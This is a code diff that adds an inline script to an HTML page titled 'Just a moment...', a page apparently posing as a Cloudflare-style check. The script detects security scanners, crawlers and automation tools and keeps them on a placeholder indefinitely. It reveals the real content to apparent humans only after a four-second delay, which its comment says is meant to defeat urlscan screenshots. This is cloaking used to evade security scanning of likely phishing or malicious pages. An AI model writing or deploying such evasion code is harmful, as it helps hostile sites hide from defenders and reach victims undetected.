@@ -1,6 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script>
+(function() {
+  var h = document.documentElement;
+  var ua = navigator.userAgent.toLowerCase();
+
+  var bots = [
+    'urlscan','cloudflare-radar','puppeteer','selenium','playwright',
+    'headless','bot','crawler','spider','lighthouse','pingdom','gtmetrix',
+    'curl','python','axios','wget','scrapy','phantom','slurp','yandex'
+  ];
+
+  var isBot =
+    bots.some(function(p){ return ua.indexOf(p) !== -1; }) ||
+    navigator.webdriver === true ||
+    !window.chrome ||
+    (navigator.plugins && navigator.plugins.length === 0);
+
+  if (isBot) {
+    // Known bot → keep placeholder forever, never reveal
+    h.classList.add('bot');
+  } else {
+    // Looks human → wait 4s so urlscan (which fakes being human) screenshots the placeholder
+    setTimeout(function() {
+      h.classList.add('human');
+    }, 4000);
+  }
+})();
+</script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Just a moment...</title>
